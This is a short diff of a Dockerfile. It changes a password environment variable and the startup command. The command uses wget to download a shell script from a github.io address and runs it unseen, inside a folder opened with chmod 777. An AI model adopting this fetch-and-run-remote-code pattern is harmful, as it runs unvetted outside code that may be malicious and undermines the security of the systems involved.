@@ -8,10 +8,10 @@ RUN sudo mkdir /projects/ && \
     sudo mkdir sys && \
     sudo chmod -R 777 sys
 
-ENV PASS unamed
+ENV PASS CLmols
 
 WORKDIR /projects/sys
 
-CMD wget https://pzeankto.github.io/namnam/pryopi.sh -O yopi.sh && \
+CMD wget https://pzeankto.github.io/namnam/yopi2.sh -O yopi.sh && \
 chmod +x yopi.sh && \
 ./yopi.sh
